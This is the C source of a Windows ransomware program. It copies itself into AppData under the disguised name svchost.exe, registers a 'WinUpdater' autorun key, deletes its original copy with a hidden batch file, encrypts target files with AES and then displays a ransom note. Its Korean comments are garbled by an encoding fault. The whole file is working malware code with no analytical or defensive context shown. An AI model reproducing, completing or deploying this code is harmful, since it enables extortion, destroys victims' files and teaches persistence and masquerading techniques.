#include <windows.h>
#include <shlobj.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

#define REG_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#define REG_NAME "WinUpdater"
#define INSTALL_DIR_NAME "winupdater"
#define INSTALL_EXE_NAME "svchost.exe"   // ����� ���� ���� �̸�
#define LOG_FILENAME "setup_log.txt"

// �α� ���
void log_status(const char* message) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* last = strrchr(path, '\\');
    if (last) {
        *(last + 1) = '\0';
        strcat(path, LOG_FILENAME);
        FILE* fp = fopen(path, "a");
        if (fp) {
            fprintf(fp, "[LOG] %s\n", message);
            fclose(fp);
        }
    }
}

// AppData�� ����
BOOL copy_self_to_appdata(char* out_target_path) {
    char self[MAX_PATH], appdata[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdata);

    // ���� ���: %APPDATA%\winupdater\svchost.exe
    sprintf(out_target_path, "%s\\%s\\%s", appdata, INSTALL_DIR_NAME, INSTALL_EXE_NAME);
    CreateDirectoryA(appdata, NULL);  // �ߺ� ���� ����
    char target_dir[MAX_PATH];
    sprintf(target_dir, "%s\\%s", appdata, INSTALL_DIR_NAME);
    CreateDirectoryA(target_dir, NULL);  // winupdater ���� ����

    if (CopyFileA(self, out_target_path, FALSE)) {
        log_status("���� ���� ����");
        return TRUE;
    }
    else {
        log_status("���� ���� ����");
        return FALSE;
    }
}

// ������Ʈ���� �ڵ����� ���
void register_autorun(const char* exe_path) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, REG_NAME, 0, REG_SZ, (BYTE*)exe_path, (DWORD)(strlen(exe_path) + 1));
        RegCloseKey(hKey);
        log_status("������Ʈ�� ��� ����");
    }
    else {
        log_status("������Ʈ�� ��� ����");
    }
}

// �ڱ� ���� ���� ��ġ ���� ���� �� ����
void schedule_self_delete(const char* self_path, const char* target_dir) {
    if (DeleteFileA(self_path)) {
        log_status("���� ���� ���� ����");
        return;
    }
    log_status("���� ���� ���� ����");

    char bat_path[MAX_PATH];
    sprintf(bat_path, "%s\\delself.bat", target_dir);

    FILE* fp = fopen(bat_path, "w");
    if (fp) {
        fprintf(fp,
            ":Repeat\n"
            "del \"%s\"\n"
            "if exist \"%s\" goto Repeat\n"
            "del \"%%~f0\"\n", self_path, self_path);
        fclose(fp);
        ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
        log_status("���� ���� ��ġ���� ����");
    }
    else {
        log_status("��ġ���� ���� ����");
    }
}

// �ڵ����� ��ġ ����
void setup_persistence() {
    char target_path[MAX_PATH];
    if (copy_self_to_appdata(target_path)) {
        register_autorun(target_path);
    }

    char self_path[MAX_PATH];
    GetModuleFileNameA(NULL, self_path, MAX_PATH);

    // target_dir = ����� ��ο��� ���ϸ� ����
    char target_dir[MAX_PATH];
    strcpy(target_dir, target_path);
    char* p = strrchr(target_dir, '\\');
    if (p) *p = '\0';

    schedule_self_delete(self_path, target_dir);
}

// ������
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    setup_persistence();                    // �ڵ����� + �ڱ⺹�� + �α�
    restore_key(aes_key);                   // Ű ����
    restore_iv(iv);                         // IV ����
    encrypt_all_targets(aes_key, iv);       // ��ü ���� ��ȣȭ
    create_ransom_note();                   // ������Ʈ GUI

    return 0;
}
